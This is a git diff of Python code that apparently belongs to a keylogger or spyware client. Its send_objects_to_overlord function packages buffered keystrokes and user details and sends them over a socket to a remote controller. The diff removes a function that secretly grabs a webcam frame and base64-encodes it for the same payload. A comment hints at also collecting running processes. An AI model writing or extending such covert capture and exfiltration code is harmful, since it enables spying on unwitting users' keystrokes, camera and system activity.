@@ -1,9 +1,7 @@
 import socket
 import json
 import struct
-from sys_platform import get_platform
-import cv2
-import base64
+from models.user import User
 import psutil
 import os
 
@@ -31,17 +29,10 @@ def send_payload_to_socket(payload):
 def send_objects_to_overlord(buffered_keys):
     keys = [key.__dict__ for key in buffered_keys]
     payload = {}
-    payload['user'] = get_platform()
-    payload['user']['image'] = get_image()
+    payload['user'] = User().__dict__
     # payload['user']['processes'] = get_running_processes()
     payload['keys'] = keys
     send_payload_to_socket(json.dumps(payload))
-
-def get_image():
-    cap = cv2.VideoCapture(0)
-    ret, frame = cap.read()
-    retval, buffer = cv2.imencode('.jpg', frame)
-    return base64.b64encode(buffer)
 
 def get_running_user_processes():
     # TODO change to user processes
